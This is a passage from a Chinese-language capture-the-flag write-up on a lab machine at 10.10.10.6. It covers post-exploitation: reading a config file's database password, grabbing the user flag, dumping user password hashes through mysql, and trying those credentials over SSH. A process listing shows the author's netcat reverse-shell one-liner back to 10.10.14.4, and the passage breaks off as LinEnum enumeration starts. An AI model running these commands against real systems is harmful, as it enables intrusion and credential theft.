$file[&#x27;</span>path<span class="hljs-string">&#x27;];</span><br><span class="hljs-string">$multitorrentsize = torsize ($file[&#x27;</span>length<span class="hljs-string">&#x27;]);</span><br><span class="hljs-string">$torrentsize += $file[&#x27;</span>length<span class="hljs-string">&#x27;];</span><br><span class="hljs-string">$combinedsize = torsize($torrentsize);</span><br><span class="hljs-string">$strname = strip_tags ($multiname[0]);</span><br><span class="hljs-string"></span><br><span class="hljs-string">$strname = htmlentities($strname);</span><br><span class="hljs-string">$strname = strip_tags($strname);</span><br><span class="hljs-string"></span><br><span class="hljs-string">echo &quot;&lt;tr&gt;&lt;td width=\&quot;50%\&quot;&gt;$strname&lt;/td&gt;&lt;td&gt; $multitorrentsize&lt;/td&gt;&lt;/tr&gt;&quot;;</span><br><span class="hljs-string">$row_count++;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">else</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">$singletf = $infovariable[&#x27;</span>name<span class="hljs-string">&#x27;] ;</span><br><span class="hljs-string">$singletf  = strip_tags($singletf );</span><br><span class="hljs-string">$torrentsize = torsize($infovariable[&#x27;</span>length<span class="hljs-string">&#x27;]);</span><br><span class="hljs-string"></span><br><span class="hljs-string">$singletf = htmlentities($singletf);</span><br><span class="hljs-string">$singletf = strip_tags($singletf);</span><br><span class="hljs-string"></span><br><span class="hljs-string">echo &quot;&lt;tr&gt;&lt;td width=\&quot;80%\&quot;&gt;$torrentsize&lt;/td&gt;&lt;td&gt;$singletf&lt;/td&gt;&lt;/tr&gt;&quot;;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function connect ($dbhost, $dbuser, $dbpass, $database)</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">$errormes = &#x27;</span>The sql server has encountered a problem, we are trying to fix it as soon as possible<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">@$connection = mysql_connect($dbhost, $dbuser, $dbpass);</span><br><span class="hljs-string">@mysql_select_db($database) or die($errormes);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">$ </span><br></code></pre></td></tr></table></figure>

<p>18、特意显示下发现的账号密码信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$CFG</span>-&gt;host = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dbName = <span class="hljs-string">&quot;torrenthoster&quot;</span>;       //db name<br><span class="hljs-variable">$CFG</span>-&gt;dbUserName = <span class="hljs-string">&quot;torrent&quot;</span>;    //db username<br><span class="hljs-variable">$CFG</span>-&gt;dbPassword = <span class="hljs-string">&quot;SuperSecret!!&quot;</span>;   //db password<br></code></pre></td></tr></table></figure>

<p>19、然后我去翻用户的目录，发现我直接可以查看 uset.txt 文件，嘿嘿</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -la /home<br>total 12<br>drwxr-xr-x  3 root   root   4096 Mar 17  2017 .<br>drwxr-xr-x 21 root   root   4096 Jan  2 14:48 ..<br>drwxr-xr-x  3 george george 4096 Oct 26 14:57 george<br>$ <span class="hljs-built_in">ls</span> -la /home/george<br>total 860<br>drwxr-xr-x 3 george george   4096 Oct 26 14:57 .<br>drwxr-xr-x 3 root   root     4096 Mar 17  2017 ..<br>lrwxrwxrwx 1 george george      9 Oct 26  2020 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 george george    220 Mar 17  2017 .bash_logout<br>-rw-r--r-- 1 george george   3180 Mar 17  2017 .bashrc<br>drwxr-xr-x 2 george george   4096 Mar 17  2017 .cache<br>-rw-r--r-- 1 george george    675 Mar 17  2017 .profile<br>-rw-r--r-- 1 george george      0 Mar 17  2017 .sudo_as_admin_successful<br>-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip<br>-rw-r--r-- 1 george george     33 Jan  2 14:48 user.txt<br>$ <span class="hljs-built_in">cat</span> /home/george/user.txt<br>46716af63b9b0e4f27387e81f451e5da<br>$ <br></code></pre></td></tr></table></figure>

<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>20、通过查看进程情况，发现还是存在MySQL数据运行的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ss -lt<br>sh: ss: not found<br>$ ps -aux<br>Warning: bad ps syntax, perhaps a bogus <span class="hljs-string">&#x27;-&#x27;</span>? See http://procps.sf.net/faq.html<br>USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br>root         1  0.0  0.1   2528  1416 ?        Ss   14:48   0:01 /sbin/init<br>root         2  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kthreadd]<br>root         3  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [migration/0]<br>root         4  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [ksoftirqd/0]<br>root         5  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [watchdog/0]<br>root         6  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [events/0]<br>root         7  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [cpuset]<br>root         8  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [khelper]<br>root         9  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [netns]<br>root        10  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [async/mgr]<br>root        11  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kintegrityd/0]<br>root        12  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kblockd/0]<br>root        13  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kacpid]<br>root        14  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kacpi_notify]<br>root        15  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kacpi_hotplug]<br>root        16  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [ata/0]<br>root        17  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [ata_aux]<br>root        18  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [ksuspend_usbd]<br>root        19  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [khubd]<br>root        20  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kseriod]<br>root        21  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kmmcd]<br>root        22  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [bluetooth]<br>root        23  0.0  0.0      0     0 ?        S    14:48   0:00 [khungtaskd]<br>root        24  0.0  0.0      0     0 ?        S    14:48   0:00 [pdflush]<br>root        25  0.0  0.0      0     0 ?        S    14:48   0:00 [pdflush]<br>root        26  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kswapd0]<br>root        27  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [aio/0]<br>root        28  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [ecryptfs-kthrea]<br>root        29  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [crypto/0]<br>root        32  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [pciehpd]<br>root        34  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_0]<br>root        35  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_1]<br>root        36  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_2]<br>root        37  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_3]<br>root        38  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_4]<br>root        39  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_5]<br>root        40  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_6]<br>root        41  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_7]<br>root        42  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_8]<br>root        43  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_9]<br>root        44  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_10]<br>root        45  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_11]<br>root        46  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_12]<br>root        47  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_13]<br>root        48  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_14]<br>root        49  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_15]<br>root        50  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_16]<br>root        51  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_17]<br>root        52  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_18]<br>root        53  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_19]<br>root        54  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_20]<br>root        55  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_21]<br>root        56  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_22]<br>root        57  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_23]<br>root        58  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_24]<br>root        59  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_25]<br>root        60  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_26]<br>root        61  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_27]<br>root        62  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_28]<br>root        63  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_29]<br>root        64  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_30]<br>root        66  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_31]<br>root        68  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kstriped]<br>root        70  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kmpathd/0]<br>root        72  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kmpath_handlerd]<br>root        74  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [ksnapd]<br>root        76  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kondemand/0]<br>root        78  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kconservative/0]<br>root        80  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [krfcommd]<br>root       202  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [mpt_poll_0]<br>root       293  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [mpt/0]<br>root       417  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [scsi_eh_32]<br>root       432  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kdmflush]<br>root       434  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kdmflush]<br>root       524  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kjournald2]<br>root       574  0.0  0.0   2284   836 ?        S    14:48   0:00 upstart-udev-bridge --daemon<br>root       577  0.0  0.1   2768  1224 ?        S&lt;s  14:48   0:00 udevd --daemon<br>root       777  0.0  0.1   2764  1184 ?        S&lt;   14:48   0:00 udevd --daemon<br>root       778  0.0  0.1   2764  1184 ?        S&lt;   14:48   0:00 udevd --daemon<br>root       820  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [kpsmoused]<br>root       878  0.0  0.0   1852   544 ?        Ss   14:48   0:00 <span class="hljs-built_in">dd</span> bs=1 <span class="hljs-keyword">if</span>=/proc/kmsg of=/var/run/rsyslog/kmsg<br>syslog     921  0.0  0.1  33528  1536 ?        Sl   14:48   0:00 rsyslogd -c4<br>root      1075  0.0  0.0   1704   544 tty4     Ss+  14:48   0:00 /sbin/getty -8 38400 tty4<br>root      1082  0.0  0.0   1704   544 tty5     Ss+  14:48   0:00 /sbin/getty -8 38400 tty5<br>root      1085  0.0  0.0   1704   544 tty2     Ss+  14:48   0:00 /sbin/getty -8 38400 tty2<br>root      1086  0.0  0.0   1704   540 tty3     Ss+  14:48   0:00 /sbin/getty -8 38400 tty3<br>root      1088  0.0  0.0   1704   548 tty6     Ss+  14:48   0:00 /sbin/getty -8 38400 tty6<br>root      1096  0.0  0.0   2092   872 ?        Ss   14:48   0:00 cron<br>daemon    1097  0.0  0.0   1964   420 ?        Ss   14:48   0:00 atd<br>root      1239  0.0  0.0   1752   536 ?        S    14:48   0:00 /bin/sh /usr/bin/mysqld_safe<br>root      1279  0.0  0.0      0     0 ?        S&lt;   14:48   0:00 [vmmemctl]<br>mysql     1485  0.0  1.8 147048 18612 ?        Sl   14:48   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306<br>root      1487  0.0  0.0   1668   548 ?        S    14:48   0:00 logger -t mysqld -p daemon.error<br>root      1637  0.0  0.6  33324  6980 ?        Ss   14:48   0:00 /usr/sbin/apache2 -k start<br>root      1657  0.0  0.0   1704   548 tty1     Ss+  14:48   0:00 /sbin/getty -8 38400 tty1<br>root      1659  0.0  0.3  17008  3812 ?        Sl   14:48   0:03 /usr/sbin/vmtoolsd<br>root      1697  0.0  0.7  13752  7680 ?        S    14:48   0:00 /usr/lib/vmware-vgauth/VGAuthService -s<br>root      1717  0.0  0.0   2144   304 ?        Ss   14:48   0:00 dhclient3 -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp3/dhclient.eth0.leases eth0<br>root      1767  0.0  0.1   5436  1076 ?        Ss   14:48   0:00 /usr/sbin/sshd<br>www-data  1840  0.0  0.7  34180  7348 ?        S    15:09   0:00 /usr/sbin/apache2 -k start<br>www-data  1843  0.0  0.7  34228  8040 ?        S    15:09   0:00 /usr/sbin/apache2 -k start<br>www-data  1844  0.0  0.7  34244  7536 ?        S    15:09   0:00 /usr/sbin/apache2 -k start<br>www-data  1854  0.0  0.7  34208  7504 ?        S    15:17   0:00 /usr/sbin/apache2 -k start<br>www-data  1859  0.0  0.7  34308  7572 ?        S    15:18   0:00 /usr/sbin/apache2 -k start<br>www-data  1868  0.0  0.6  34040  6752 ?        S    15:26   0:00 /usr/sbin/apache2 -k start<br>www-data  1869  0.0  0.4  33908  4708 ?        S    15:26   0:00 /usr/sbin/apache2 -k start<br>www-data  1870  0.0  0.6  34068  6936 ?        S    15:26   0:00 /usr/sbin/apache2 -k start<br>www-data  1871  0.0  0.6  33908  6728 ?        S    15:26   0:00 /usr/sbin/apache2 -k start<br>www-data  1889  0.0  0.6  33672  6284 ?        S    15:46   0:00 /usr/sbin/apache2 -k start<br>www-data  1890  0.0  0.0   1752   488 ?        S    15:57   0:00 sh -c <span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.4 443 &gt;/tmp/f<br>www-data  1893  0.0  0.0   1704   412 ?        S    15:57   0:00 <span class="hljs-built_in">cat</span> /tmp/f<br>www-data  1894  0.0  0.0   1752   504 ?        R    15:57   0:00 sh -i<br>www-data  1895  0.0  0.0   1724   608 ?        R    15:57   0:00 nc 10.10.14.4 443<br>www-data  1905  0.0  0.0   2364   928 ?        R    16:02   0:00 ps -aux<br>$ <br></code></pre></td></tr></table></figure>

<p>21、这里使用上面翻阅到的数据库账号密码情况，去登录下数据库看一下信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <br>$ mysql -u <span class="hljs-string">&#x27;torrent&#x27;</span> --password=<span class="hljs-string">&#x27;SuperSecret!!&#x27;</span> -e <span class="hljs-string">&#x27;show databases&#x27;</span><br>Database<br>information_schema<br>torrenthoster<br>$ mysql -u <span class="hljs-string">&#x27;torrent&#x27;</span> --password=<span class="hljs-string">&#x27;SuperSecret!!&#x27;</span> -D torrenthoster -e <span class="hljs-string">&#x27;show tables</span><br><span class="hljs-string">&gt; &#x27;</span><br>Tables_in_torrenthoster<br>ban<br>categories<br>comments<br><span class="hljs-built_in">log</span><br>namemap<br>news<br>subcategories<br><span class="hljs-built_in">users</span><br>$ mysql -u <span class="hljs-string">&#x27;torrent&#x27;</span> --password=<span class="hljs-string">&#x27;SuperSecret!!&#x27;</span> -D torrenthoster -e <span class="hljs-string">&#x27;users&#x27;</span><br>ERROR 1064 (42000) at line 1: You have an error <span class="hljs-keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="hljs-keyword">for</span> the right syntax to use near <span class="hljs-string">&#x27;users&#x27;</span> at line 1<br>$ mysql -u <span class="hljs-string">&#x27;torrent&#x27;</span> --password=<span class="hljs-string">&#x27;SuperSecret!!&#x27;</span> -D torrenthoster -e <span class="hljs-string">&#x27;describe users&#x27;</span><br>Field   Type    Null    Key     Default Extra<br><span class="hljs-built_in">id</span>      int(10) unsigned        NO      PRI     NULL    auto_increment<br>userName        varchar(40)     NO      UNI<br>password        varchar(40)     NO<br>privilege       varchar(10)     NO<br>email   varchar(30)     NO<br>joined  datetime        NO              0000-00-00 00:00:00<br>lastconnect     datetime        NO              0000-00-00 00:00:00<br>$ mysql -u <span class="hljs-string">&#x27;torrent&#x27;</span> --password=<span class="hljs-string">&#x27;SuperSecret!!&#x27;</span> -D torrenthoster <span class="hljs-string">&#x27;select userName,password from users&#x27;</span><br>ERROR 1044 (42000): Access denied <span class="hljs-keyword">for</span> user <span class="hljs-string">&#x27;torrent&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> to database <span class="hljs-string">&#x27;select userName,password from users&#x27;</span><br>$ mysql -u <span class="hljs-string">&#x27;torrent&#x27;</span> --password=<span class="hljs-string">&#x27;SuperSecret!!&#x27;</span> -D torrenthoster -e <span class="hljs-string">&#x27;select userName,password from users&#x27;</span><br>userName        password<br>Admin   d5bfedcee289e5e05b86daad8ee3e2e2<br><span class="hljs-built_in">test</span>    098f6bcd4621d373cade4e832627b4f6<br>$ <br></code></pre></td></tr></table></figure>

<p>22、但是 admin 密码无法破解，我又使用数据的密码，去ssh 登录 george ，发现也是无法登录，初始命令行里，使用su也无法切换，说明这个密码是不对的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh george@10.10.10.6<br>Unable to negotiate with 10.10.10.6 port 22: no matching host key <span class="hljs-built_in">type</span> found. Their offer: ssh-rsa,ssh-dss<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh -oHostKeyAlgorithms=+ssh-dss george@10.10.10.6<br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.6 (10.10.10.6)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">DSA key fingerprint is SHA256:aioUHN0baIWMqg/K4OfQoSDFWO0jbTlod7tSnXT8YrM.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.6<span class="hljs-string">&#x27; (DSA) to the list of known hosts.</span><br><span class="hljs-string">george@10.10.10.6&#x27;</span>s password: <br>Permission denied, please try again.<br>george@10.10.10.6<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Permission denied, please try again.</span><br><span class="hljs-string">george@10.10.10.6&#x27;</span>s password: <br>george@10.10.10.6: Permission denied (publickey,password).<br><br>$ su george<br>su: must be run from a terminal<br>$ su - george<br>su: must be run from a terminal<br>$ <br></code></pre></td></tr></table></figure>

<p>23、然后我又去 george 的根目录里一顿翻阅，结果还是什么都没发现（记重点，这里粗心了，没有一一翻阅文件，只是大体上看了一遍）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">pwd</span><br>/home/george<br>$ <span class="hljs-built_in">ls</span> -la<br>total 860<br>drwxr-xr-x 3 george george   4096 Oct 26 14:57 .<br>drwxr-xr-x 3 root   root     4096 Mar 17  2017 ..<br>lrwxrwxrwx 1 george george      9 Oct 26  2020 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 george george    220 Mar 17  2017 .bash_logout<br>-rw-r--r-- 1 george george   3180 Mar 17  2017 .bashrc<br>drwxr-xr-x 2 george george   4096 Mar 17  2017 .cache<br>-rw-r--r-- 1 george george    675 Mar 17  2017 .profile<br>-rw-r--r-- 1 george george      0 Mar 17  2017 .sudo_as_admin_successful<br>-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip<br>-rw-r--r-- 1 george george     33 Jan  2 14:48 user.txt<br>$ <span class="hljs-built_in">cat</span> .sudo_as_admin_successful<br>$ .profile<br>sh: .profile: not found<br>$ <span class="hljs-built_in">cat</span> .profile<br><span class="hljs-comment"># ~/.profile: executed by the command interpreter for login shells.</span><br><span class="hljs-comment"># This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login</span><br><span class="hljs-comment"># exists.</span><br><span class="hljs-comment"># see /usr/share/doc/bash/examples/startup-files for examples.</span><br><span class="hljs-comment"># the files are located in the bash-doc package.</span><br><br><span class="hljs-comment"># the default umask is set in /etc/profile; for setting the umask</span><br><span class="hljs-comment"># for ssh logins, install and configure the libpam-umask package.</span><br><span class="hljs-comment">#umask 022</span><br><br><span class="hljs-comment"># if running bash</span><br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$BASH_VERSION</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-comment"># include .bashrc if it exists</span><br>    <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.bashrc&quot;</span> ]; <span class="hljs-keyword">then</span><br>        . <span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.bashrc&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># set PATH so it includes user&#x27;s private bin if it exists</span><br><span class="hljs-keyword">if</span> [ -d <span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/bin&quot;</span> ] ; <span class="hljs-keyword">then</span><br>    PATH=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br><span class="hljs-keyword">fi</span><br>$ <br>$ <br></code></pre></td></tr></table></figure>

<p>24、然后我就开始上枚举神器了，进行枚举 LinEnum.sh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 